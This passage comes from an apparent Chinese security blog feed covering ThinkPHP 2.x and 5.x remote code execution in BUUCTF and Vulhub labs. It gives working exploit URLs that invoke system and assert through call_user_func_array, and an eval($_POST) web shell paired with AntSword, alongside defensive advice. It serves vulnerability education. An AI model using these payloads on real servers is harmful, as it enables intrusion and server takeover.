&lt;figure class=&#34;highlight asciidoc&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs asciidoc&#34;&gt;&lt;span class=&#34;hljs-link&#34;&gt;http://node5.buuoj.cn:27945/index.php?s=index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;0&lt;/span&gt;]=system&amp;amp;vars[1][]=cat+/var/www/html/flag&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;结果&lt;/strong&gt;：页面返回类似：&lt;/p&gt;
&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;flag&lt;/span&gt;&amp;#123;d64e3f2e-xxxx-xxxx-xxxx-&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;ed8fe1b43f3&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;4-使用蚁剑连接-1&#34;&gt;&lt;a href=&#34;#4-使用蚁剑连接-1&#34; class=&#34;headerlink&#34; title=&#34;4. 使用蚁剑连接&#34;&gt;&lt;/a&gt;4. 使用蚁剑连接&lt;/h3&gt;&lt;p&gt;与 ThinkPHP 2.x 类似，可构造 POST 参数的一句话木马：&lt;/p&gt;
&lt;figure class=&#34;highlight asciidoc&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs asciidoc&#34;&gt;&lt;span class=&#34;hljs-link&#34;&gt;http://node5.buuoj.cn:27945/index.php?s=index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;0&lt;/span&gt;]=assert&amp;amp;vars[1][]=eval($_POST[1])&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;蚁剑配置&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;URL&lt;/strong&gt;：上述地址&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;密码&lt;/strong&gt;：&lt;code&gt;1&lt;/code&gt;（对应 &lt;code&gt;$_POST[1]&lt;/code&gt;）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;类型&lt;/strong&gt;：PHP（原生）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;编码&lt;/strong&gt;：默认&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;连接后可进行文件管理、命令执行等操作。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;四、防御措施&#34;&gt;&lt;a href=&#34;#四、防御措施&#34; class=&#34;headerlink&#34; title=&#34;四、防御措施&#34;&gt;&lt;/a&gt;四、防御措施&lt;/h2&gt;&lt;h3 id=&#34;1-升级-ThinkPHP-版本&#34;&gt;&lt;a href=&#34;#1-升级-ThinkPHP-版本&#34; class=&#34;headerlink&#34; title=&#34;1. 升级 ThinkPHP 版本&#34;&gt;&lt;/a&gt;1. 升级 ThinkPHP 版本&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;ThinkPHP 2.x&lt;/strong&gt;：升级到更高版本（如 3.x 或 5.0.24+），修复模板解析漏洞。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ThinkPHP 5.x&lt;/strong&gt;：升级到 5.0.24 或更高版本，官方已修复 RCE 漏洞。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;2-输入验证与过滤&#34;&gt;&lt;a href=&#34;#2-输入验证与过滤&#34; class=&#34;headerlink&#34; title=&#34;2. 输入验证与过滤&#34;&gt;&lt;/a&gt;2. 输入验证与过滤&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;白名单验证&lt;/strong&gt;：限制 &lt;code&gt;s&lt;/code&gt; 参数和模板变量，只允许预定义值。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;过滤危险函数&lt;/strong&gt;：禁用 &lt;code&gt;eval&lt;/code&gt;、&lt;code&gt;assert&lt;/code&gt;、&lt;code&gt;call_user_func_array&lt;/code&gt; 等高危函数。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;参数校验&lt;/strong&gt;：对用户输入进行严格过滤，防止注入。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;3-禁用危险函数&#34;&gt;&lt;a href=&#34;#3-禁用危险函数&#34; class=&#34;headerlink&#34; title=&#34;3. 禁用危险函数&#34;&gt;&lt;/a&gt;3. 禁用危险函数&lt;/h3&gt;&lt;p&gt;在 &lt;code&gt;php.ini&lt;/code&gt; 中禁用高危函数：&lt;/p&gt;
&lt;figure class=&#34;highlight ini&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs ini&#34;&gt;&lt;span class=&#34;hljs-attr&#34;&gt;disable_functions&lt;/span&gt; = eval,assert,exec,system,passthru,shell_exec,proc_open,call_user_func_array&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;4-最小权限原则&#34;&gt;&lt;a href=&#34;#4-最小权限原则&#34; class=&#34;headerlink&#34; title=&#34;4. 最小权限原则&#34;&gt;&lt;/a&gt;4. 最小权限原则&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;配置 Web 服务器以最低权限运行（如非 root 用户）。&lt;/li&gt;
&lt;li&gt;限制 PHP 脚本的文件系统访问权限。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;5-Web-应用防火墙（WAF）&#34;&gt;&lt;a href=&#34;#5-Web-应用防火墙（WAF）&#34; class=&#34;headerlink&#34; title=&#34;5. Web 应用防火墙（WAF）&#34;&gt;&lt;/a&gt;5. Web 应用防火墙（WAF）&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;部署 WAF，拦截包含可疑路由（如 &lt;code&gt;\think\app&lt;/code&gt;）或函数（如 &lt;code&gt;system&lt;/code&gt;）的请求。&lt;/li&gt;
&lt;li&gt;使用正则规则匹配异常 Payload。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;6-安全审计与监控&#34;&gt;&lt;a href=&#34;#6-安全审计与监控&#34; class=&#34;headerlink&#34; title=&#34;6. 安全审计与监控&#34;&gt;&lt;/a&gt;6. 安全审计与监控&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;定期扫描 Web 应用，检查已知漏洞。&lt;/li&gt;
&lt;li&gt;监控服务器日志，及时发现异常请求。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;五、总结&#34;&gt;&lt;a href=&#34;#五、总结&#34; class=&#34;headerlink&#34; title=&#34;五、总结&#34;&gt;&lt;/a&gt;五、总结&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;项目&lt;/th&gt;
&lt;th&gt;ThinkPHP 2.x RCE&lt;/th&gt;
&lt;th&gt;ThinkPHP 5.x RCE&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;漏洞名称&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;ThinkPHP 2.x RCE&lt;/td&gt;
&lt;td&gt;ThinkPHP 5.x RCE&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;影响版本&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;ThinkPHP 2.x&lt;/td&gt;
&lt;td&gt;ThinkPHP &amp;lt;&amp;#x3D; 5.0.23&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;漏洞原因&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;模板变量解析未过滤&lt;/td&gt;
&lt;td&gt;动态函数调用未授权&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;利用方法&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;GET&amp;#x2F;POST 参数构造 &lt;code&gt;eval&lt;/code&gt;&amp;#x2F;&lt;code&gt;assert&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;GET 请求构造路由 + 函数调用&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;关键函数&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;eval&lt;/code&gt;, &lt;code&gt;assert&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;call_user_func_array&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;检测方式&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;使用 &lt;code&gt;$&amp;#123;@phpinfo()&amp;#125;&lt;/code&gt; 探测&lt;/td&gt;
&lt;td&gt;使用 &lt;code&gt;phpinfo&lt;/code&gt; 探测，再尝试 &lt;code&gt;system&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;练习平台&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;BUUCTF（如 &lt;code&gt;node3.buuoj.cn:26104&lt;/code&gt;）&lt;/td&gt;
&lt;td&gt;BUUCTF（如 &lt;code&gt;node5.buuoj.cn:27945&lt;/code&gt;）&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;ThinkPHP 2.x 和 5.x 的 RCE 漏洞利用简单但危害极大，攻击者可通过简单的 URL 构造实现代码或命令执行，甚至完全控制服务器。BUUCTF 靶场为我们提供了便捷的复现环境，通过本文的演示，读者可以深入理解漏洞原理和利用流程。开发者应及时升级框架、加强输入验证、部署 WAF 和监控机制，以有效防范此类漏洞。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;免责声明&lt;/strong&gt;：本文内容仅供安全研究和防护参考，请勿用于非法攻击活动。&lt;/p&gt;
&lt;/blockquote&gt;
</content>
        <category term="Web安全" />
        <category term="RCE" />
        <category term="漏洞复现" />
        <category term="ThinkPHP" />
        <updated>2025-07-28T06:18:44.000Z</updated>
    </entry>
    <entry>
        <id>https://bae-ace.github.io/2025/07/27/ThinkPHP-5-x-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%9F%BA%E4%BA%8E-Vulhub-%E7%8E%AF%E5%A2%83%EF%BC%89/</id>
        <title>ThinkPHP 5.x 远程代码执行漏洞（基于 Vulhub 环境）</title>
        <link rel="alternate" href="https://bae-ace.github.io/2025/07/27/ThinkPHP-5-x-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%9F%BA%E4%BA%8E-Vulhub-%E7%8E%AF%E5%A2%83%EF%BC%89/"/>
        <content type="html">&lt;h1 id=&#34;深入剖析-ThinkPHP-5-x-远程代码执行漏洞（基于-Vulhub-环境）&#34;&gt;&lt;a href=&#34;#深入剖析-ThinkPHP-5-x-远程代码执行漏洞（基于-Vulhub-环境）&#34; class=&#34;headerlink&#34; title=&#34;深入剖析 ThinkPHP 5.x 远程代码执行漏洞（基于 Vulhub 环境）&#34;&gt;&lt;/a&gt;深入剖析 ThinkPHP 5.x 远程代码执行漏洞（基于 Vulhub 环境）&lt;/h1&gt;&lt;h2 id=&#34;一、漏洞背景简介-🔍&#34;&gt;&lt;a href=&#34;#一、漏洞背景简介-🔍&#34; class=&#34;headerlink&#34; title=&#34;一、漏洞背景简介 🔍&#34;&gt;&lt;/a&gt;一、漏洞背景简介 🔍&lt;/h2&gt;&lt;p&gt;ThinkPHP 是一个轻量且易用的 PHP 开发框架，广泛应用于 Web 开发。然而，在 ThinkPHP 5.0.x 至 5.0.23 版本中，由于框架对动态函数调用（如 &lt;code&gt;invokeFunction&lt;/code&gt;）的访问控制不严格，存在严重的 &lt;strong&gt;远程代码执行（RCE）漏洞&lt;/strong&gt;。攻击者可通过精心构造的 URL 参数，调用任意 PHP 函数（如 &lt;code&gt;phpinfo&lt;/code&gt; 或 &lt;code&gt;system&lt;/code&gt;），实现远程执行任意代码或系统命令，危害极大。&lt;/p&gt;
&lt;p&gt;本文基于 Vulhub 靶场环境，详细讲解该漏洞的原理、环境搭建、利用过程及防御措施，旨在帮助安全从业者和开发者深入理解并防范此类漏洞。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;二、漏洞环境搭建&#34;&gt;&lt;a href=&#34;#二、漏洞环境搭建&#34; class=&#34;headerlink&#34; title=&#34;二、漏洞环境搭建&#34;&gt;&lt;/a&gt;二、漏洞环境搭建&lt;/h2&gt;&lt;p&gt;为了复现 ThinkPHP 5.x RCE 漏洞，我们使用 Vulhub 提供的靶场环境，结合 Docker 和 Kali Linux 进行搭建。以下是详细步骤：&lt;/p&gt;
&lt;h3 id=&#34;1-基础环境&#34;&gt;&lt;a href=&#34;#1-基础环境&#34; class=&#34;headerlink&#34; title=&#34;1. 基础环境&#34;&gt;&lt;/a&gt;1. 基础环境&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;操作系统&lt;/strong&gt;：Kali Linux（推荐使用虚拟机）  &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;工具&lt;/strong&gt;：已安装 Docker 和 Docker Compose  &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;网络模式&lt;/strong&gt;：&lt;ul&gt;
&lt;li&gt;NAT（用于访问外部网络）&lt;/li&gt;
&lt;li&gt;仅主机模式（Host-Only，Kali IP：&lt;code&gt;192.168.56.102&lt;/code&gt;）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;硬件要求&lt;/strong&gt;：建议 4GB 内存，2 核 CPU&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;2-获取-Vulhub-项目&#34;&gt;&lt;a href=&#34;#2-获取-Vulhub-项目&#34; class=&#34;headerlink&#34; title=&#34;2. 获取 Vulhub 项目&#34;&gt;&lt;/a&gt;2. 获取 Vulhub 项目&lt;/h3&gt;&lt;p&gt;Vulhub 是一个开源的漏洞靶场集合，包含 ThinkPHP 5.x RCE 环境。执行以下命令：&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 切换到工作目录&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;cd&lt;/span&gt; /root/vulhub/thinkphp/5-rce&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 如果未下载 Vulhub，克隆项目&lt;/span&gt;&lt;br&gt;git &lt;span class=&#34;hljs-built_in&#34;&gt;clone&lt;/span&gt; https://github.com/vulhub/vulhub.git&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;cd&lt;/span&gt; vulhub/thinkphp/5-rce&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;3-启动漏洞环境&#34;&gt;&lt;a href=&#34;#3-启动漏洞环境&#34; class=&#34;headerlink&#34; title=&#34;3. 启动漏洞环境&#34;&gt;&lt;/a&gt;3. 启动漏洞环境&lt;/h3&gt;&lt;p&gt;在 vulhub&amp;#x2F;thinkphp&amp;#x2F;5-rce 目录下，运行以下命令启动 Docker 容器：&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;docker-compose up -d&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;启动后，访问以下地址：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs url&#34;&gt;http://192.168.56.102:8080&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;若看到 ThinkPHP V5 的欢迎页面，说明环境部署成功 &lt;/p&gt;
&lt;h3 id=&#34;4-容器管理操作&#34;&gt;&lt;a href=&#34;#4-容器管理操作&#34; class=&#34;headerlink&#34; title=&#34;4. 容器管理操作&#34;&gt;&lt;/a&gt;4. 容器管理操作&lt;/h3&gt;&lt;p&gt;查看运行中的容器：&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;docker ps&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;示例输出：&lt;/p&gt;
&lt;figure class=&#34;highlight zsh&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs zsh&#34;&gt;CONTAINER ID   IMAGE                       PORTS                    NAMES&lt;br&gt;e5117e659934   vulhub/thinkphp:5.0.23      0.0.0.0:8080-&amp;gt;80/tcp     thinkphp_5-rce_1&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;停止指定容器：&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;docker stop e5117e659934&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;一键停止并移除容器及网络：&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;docker-compose down&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;hr&gt;
&lt;h2 id=&#34;三、漏洞原理解析&#34;&gt;&lt;a href=&#34;#三、漏洞原理解析&#34; class=&#34;headerlink&#34; title=&#34;三、漏洞原理解析&#34;&gt;&lt;/a&gt;三、漏洞原理解析&lt;/h2&gt;&lt;h3 id=&#34;漏洞成因&#34;&gt;&lt;a href=&#34;#漏洞成因&#34; class=&#34;headerlink&#34; title=&#34;漏洞成因&#34;&gt;&lt;/a&gt;漏洞成因&lt;/h3&gt;&lt;p&gt;ThinkPHP 5.x 的控制器路由机制允许通过 URL 参数动态调用框架内部函数（如 &lt;code&gt;\think\app::invokeFunction&lt;/code&gt;）。在 5.0.23 及以下版本中，框架未对这些调用进行严格的权限校验，导致攻击者可以通过构造特定参数，调用任意 PHP 函数（如 &lt;code&gt;call_user_func_array&lt;/code&gt;），并传递函数名和参数，从而触发远程代码执行。&lt;/p&gt;
&lt;h3 id=&#34;核心问题&#34;&gt;&lt;a href=&#34;#核心问题&#34; class=&#34;headerlink&#34; title=&#34;核心问题&#34;&gt;&lt;/a&gt;核心问题&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;动态函数调用&lt;/strong&gt;：&lt;code&gt;call_user_func_array&lt;/code&gt; 允许动态调用任意 PHP 函数（如 &lt;code&gt;phpinfo&lt;/code&gt;、&lt;code&gt;system&lt;/code&gt; 等）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;参数未过滤&lt;/strong&gt;：用户输入的 &lt;code&gt;vars[0]&lt;/code&gt;（函数名）和 &lt;code&gt;vars[1][]&lt;/code&gt;（函数参数）直接传递到函数执行器，未经严格验证。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;路由暴露&lt;/strong&gt;：通过 &lt;code&gt;s=/Index/\think\app/invokefunction&lt;/code&gt;，攻击者可直接访问框架核心类。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;漏洞危害&#34;&gt;&lt;a href=&#34;#漏洞危害&#34; class=&#34;headerlink&#34; title=&#34;漏洞危害&#34;&gt;&lt;/a&gt;漏洞危害&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;执行任意 PHP 代码&lt;/li&gt;
&lt;li&gt;运行系统命令，获取权限&lt;/li&gt;
&lt;li&gt;上传 WebShell，长期控制服务器&lt;/li&gt;
&lt;li&gt;窃取配置文件、数据库信息&lt;/li&gt;
&lt;li&gt;删除文件或修改系统配置&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;四、漏洞利用演示&#34;&gt;&lt;a href=&#34;#四、漏洞利用演示&#34; class=&#34;headerlink&#34; title=&#34;四、漏洞利用演示&#34;&gt;&lt;/a&gt;四、漏洞利用演示&lt;/h2&gt;&lt;p&gt;以下展示如何利用 ThinkPHP 5.x RCE 漏洞，基于 Vulhub 靶场环境。&lt;/p&gt;
&lt;h3 id=&#34;1-测试-PHP-函数调用&#34;&gt;&lt;a href=&#34;#1-测试-PHP-函数调用&#34; class=&#34;headerlink&#34; title=&#34;1. 测试 PHP 函数调用&#34;&gt;&lt;/a&gt;1. 测试 PHP 函数调用&lt;/h3&gt;&lt;p&gt;访问以下 Payload：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs url&#34;&gt;http://192.168.56.102:8080/index.php?s=/Index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=phpinfo&amp;amp;vars[1][]=1&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;参数解析&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;s=/Index/\think\app/invokefunction&lt;/code&gt;：指定路由&lt;/li&gt;
&lt;li&gt;&lt;code&gt;function=call_user_func_array&lt;/code&gt;：调用函数&lt;/li&gt;
&lt;li&gt;&lt;code&gt;vars[0]=phpinfo&lt;/code&gt;：目标函数&lt;/li&gt;
&lt;li&gt;&lt;code&gt;vars[1][]=1&lt;/code&gt;：参数（执行 phpinfo(1)）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;结果&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;页面显示 phpinfo 配置信息，说明漏洞存在 &lt;/p&gt;
&lt;h3 id=&#34;2-执行系统命令&#34;&gt;&lt;a href=&#34;#2-执行系统命令&#34; class=&#34;headerlink&#34; title=&#34;2. 执行系统命令&#34;&gt;&lt;/a&gt;2. 执行系统命令&lt;/h3&gt;&lt;p&gt;执行 &lt;code&gt;whoami&lt;/code&gt;：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs url&#34;&gt;http://192.168.56.102:8080/index.php?s=/Index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=whoami&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;结果示例&lt;/strong&gt;：&lt;/p&gt;
&lt;figure class=&#34;highlight haskell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs haskell&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;www&lt;/span&gt;-&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;data&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;表示系统命令执行成功。&lt;/p&gt;
&lt;h3 id=&#34;其他命令测试：&#34;&gt;&lt;a href=&#34;#其他命令测试：&#34; class=&#34;headerlink&#34; title=&#34;其他命令测试：&#34;&gt;&lt;/a&gt;其他命令测试：&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;查看用户 ID：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs url&#34;&gt;http://192.168.56.102:8080/index.php?s=/Index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=id&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;列出目录：&lt;/p&gt;
